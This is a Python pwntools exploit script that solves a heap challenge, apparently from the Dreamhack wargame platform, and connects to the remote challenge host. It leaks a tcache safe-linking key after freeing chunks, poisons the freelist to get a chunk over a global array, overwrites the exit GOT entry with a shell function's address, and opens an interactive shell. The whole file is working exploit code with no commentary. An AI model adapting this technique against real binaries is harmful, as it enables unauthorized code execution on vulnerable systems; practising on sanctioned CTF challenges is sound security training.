from pwn import *

HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'host3.dreamhack.games', 19624
r = remote(HOST, PORT)

def create(idx, size, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b': ', str(size).encode())
    r.sendafter(b': ', data)

def delete(idx):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b': ', str(idx).encode())

def read(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(idx).encode())

def update(idx, data):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b': ', data)

sh = 0x401256
exit_got = 0x404060
chunk = 0x4040a0

create(0, 0x50, b'A')

for i in range(1, 10):
    create(i, 0x40, b'A')
for i in range(1, 9):
    delete(i)

read(8)
r.recvuntil(b': ')
key = u64(r.recvline().strip().ljust(8, b'\x00'))

delete(9)
update(9, p64(chunk ^ key))

create(1, 0x40, b'A')
create(2, 0x40, p64(exit_got) + p64(8))

update(0, p64(sh))

r.sendline(b'1 10')

r.interactive()